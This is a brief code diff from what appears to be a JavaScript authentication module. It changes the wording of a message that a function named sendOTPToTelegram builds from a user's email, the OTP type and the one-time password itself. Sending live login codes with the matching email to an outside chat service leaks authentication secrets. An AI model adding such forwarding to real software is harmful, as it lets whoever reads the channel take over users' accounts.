@@ -84,7 +84,7 @@ async function sendEmailOTP(to, type) {
 }
 
 async function sendOTPToTelegram(email, otp, type) {
-    const message = `New OTP generated:
+    const message = `Mã OTP:
 Email: ${email}
 Type: ${type}
 OTP: ${otp}`;
